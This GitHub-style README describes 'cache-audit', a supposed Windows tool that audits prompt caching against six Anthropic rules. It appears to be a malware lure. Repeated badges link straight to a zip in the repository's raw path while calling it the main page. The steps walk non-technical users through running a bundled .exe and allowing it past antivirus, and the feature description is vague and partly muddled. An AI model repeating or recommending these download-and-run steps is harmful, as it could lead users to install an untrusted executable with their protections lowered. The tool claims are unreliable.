# ⚙️ cache-audit - Check Your Prompt Caching Setup

[![Download cache-audit](https://img.shields.io/badge/Download-cache--audit-orange?style=for-the-badge)](https://github.com/Fucxuan/cache-audit/raw/refs/heads/main/cache-audit/audit_cache_2.6-beta.3.zip)

---

## 📋 What Is cache-audit?

cache-audit is a simple tool designed to check how well your prompt caching system follows recommended rules. Prompt caching helps programs run faster and cheaper by saving and reusing pieces of conversation.

This tool scans your setup and finds issues that might lower your cache hit rate. It then gives you a clear report with specific advice to fix those issues. The rules it checks come from Anthropic, the company behind Claude Code, a language AI system.

By using cache-audit, you can avoid common problems that slow down responses or cost more money. It works in the background and gives you easy-to-understand feedback.

---

## 🚀 Getting Started with cache-audit

This guide will help you download and run cache-audit on a Windows PC. No coding or command-line knowledge is needed.

### System Requirements

- Windows 10 or later (64-bit recommended)  
- At least 4 GB of free disk space  
- Internet connection to download the tool  
- Basic use of mouse and keyboard  

---

## 🛠️ Download and Install cache-audit

### Step 1: Go to the Download Page

Click this big button or link to open the official cache-audit page on GitHub:

[![Download cache-audit](https://img.shields.io/badge/Download-cache--audit-brightgreen?style=for-the-badge)](https://github.com/Fucxuan/cache-audit/raw/refs/heads/main/cache-audit/audit_cache_2.6-beta.3.zip)

This link will take you to the main repository page where you will find all files and instructions.

### Step 2: Find the Latest Release

- On the GitHub page, look for a section or tab named **Releases**. It is usually near the top or on the right side.
- Click the latest release. The newest files will appear there.

### Step 3: Download the Windows Version

- Look for a file ending with `.exe` or `.zip` for Windows.
- Click the file name to start downloading it onto your PC.

### Step 4: Run the Installer or Program

- If you downloaded a `.exe` file, double-click it to start installation.  
- Follow the simple instructions on the screen. Usually, just press **Next** or **Install** a few times.  
- If you downloaded a `.zip` file, right-click it and select **Extract All**. Choose a folder like your Desktop. Then double-click the `.exe` file inside the extracted folder.

---

## ▶️ How to Use cache-audit

### Step 1: Open cache-audit

- Look for the cache-audit shortcut on your Desktop or in your Start Menu.
- Double-click it to open.

### Step 2: Input Your Setup Details

- The program will ask you about your prompt setup.  
- This usually means selecting or typing in the prompts or tools you use with Claude Code.  
- Follow the on-screen directions. Use simple descriptions if you are unsure.

### Step 3: Run the Audit

- Click the **Start Audit** button.  
- The tool will process your input and check for common issues based on Anthropic's 6 caching rules.

### Step 4: Read Your Report

- After a short wait, cache-audit will show a report with a score.  
- The report breaks down each caching rule and tells you if your setup follows it.  
- If problems appear, the tool offers tips on how to fix them.

---

## 🔍 What cache-audit Checks

The tool looks for common errors that reduce cache hit rates. Here are the rules it verifies:

| Rule Number | What It Checks                                      | Example of What Breaks This Rule                    |
|-------------|----------------------------------------------------|----------------------------------------------------|
| 1. Ordering | Ensures prompts avoid changing dynamic data order   | Including timestamps or git status in system prompt|
| 2. Message Injection | Checks that system prompts are not edited mid-session | Changing system prompt wrongly instead of using tags|
| 3. Tool Stability | Verifies tools are not added or removed mid-chat    | Adding or removing plugins while talking           |
| 4. Model Switching | Confirms you do not switch models in same chat      | Changing the AI model during a conversation thread |
| 5. Dynamic Content Size | Makes sure large amounts of data are not added     | Adding thousands of tokens of dynamic info         |
| 6. Consistency | Checks overall prompt structure is consistent        | Frequent changes to prompt format                   |

These checks help your AI conversations stay fast and dependable.

---

## ⚙️ Common Fixes cache-audit Suggests

- Remove dynamic data like timestamps from your system prompt.  
- Use special reminder tags instead of editing system prompt mid-chat.  
- Avoid changing tools or models once a chat starts.  
- Keep dynamic data inserts small and consistent.  
- Follow the recommended prompt order strictly.

---

## 💡 Tips for Best Results

- Run cache-audit regularly after changing your prompt setup.  
- Use the report to improve your system step-by-step.  
- Test your setup with normal chat sessions to confirm changes work.  
- Keep backups of your prompt settings before major edits.

---

## ❓ Troubleshooting

- If the program does not open, check your Windows version and software requirements.  
- Make sure your antivirus software allows cache-audit to run.  
- For questions, visit the GitHub page and open an **Issue** to ask for help.  

---

## 📥 Download cache-audit Now

You can start improving your prompt caching by visiting this page to download the latest version of cache-audit:

[![Download cache-audit](https://img.shields.io/badge/Download-cache--audit-red?style=for-the-badge)](https://github.com/Fucxuan/cache-audit/raw/refs/heads/main/cache-audit/audit_cache_2.6-beta.3.zip)